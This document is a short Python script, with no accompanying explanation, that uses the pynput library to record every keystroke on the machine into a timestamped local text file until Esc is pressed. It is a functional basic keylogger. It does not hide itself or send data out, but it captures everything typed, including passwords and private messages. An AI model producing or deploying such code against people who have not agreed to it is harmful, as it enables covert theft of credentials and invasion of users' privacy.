from pynput.keyboard import Key, Listener
from time import time

def on_press(key, f):
    if key == Key.esc:
        f.close()
        return False
    try:
        f.write('{0}'.format(key.char))
    except AttributeError:
        f.write(' {0} '.format(key))

with open("keystrokes_" + str(time()) + ".txt", 'w') as f:
    with Listener(
            on_press=lambda event: on_press(event, f)
            ) as listener:
        listener.join()